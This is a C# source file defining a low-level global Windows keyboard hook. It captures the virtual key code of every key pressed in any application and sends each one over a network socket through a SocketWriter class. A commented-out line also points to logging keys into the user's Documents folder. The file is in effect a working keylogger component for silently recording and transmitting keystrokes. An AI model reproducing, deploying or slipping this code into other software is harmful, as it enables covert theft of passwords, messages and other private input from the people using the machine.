﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using SocketDLL;

namespace HookDLL
{
    public class LLKeyboardHook
    {
        public delegate IntPtr LLKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x0101;
        private static LLKeyboardProc _proc;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool _disposed = false;
        private static string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        public LLKeyboardHook()
        {
            _proc = HookCallback;
        }

        public void Install()
        {
            _hookID = SetHook(_proc);
        }

        public void Uninstall()
        {
            _disposed = UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LLKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                /* SetWindowsHookEx(type of hook,
                 * pointer to hook procedure(HookCallback),
                 * handle for current process containing the hook procedure,
                 * id of the thread with which the hook proc is associated (0 = all threads)) */
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        internal static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            /* A keyDown event has occured */
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                /* Extract the virtual key code of the pressed key */
                int vkCode = Marshal.ReadInt32(lParam);
                SocketWriter.WriteToSocket(vkCode.ToString());
                //_log.HandleVK(vkCode, docPath, _ui);
            }
            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == 0xA0 || vkCode == 0xA1)//VK_SHIFT = 0x10
                {
                    SocketWriter.WriteToSocket(vkCode.ToString());
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LLKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
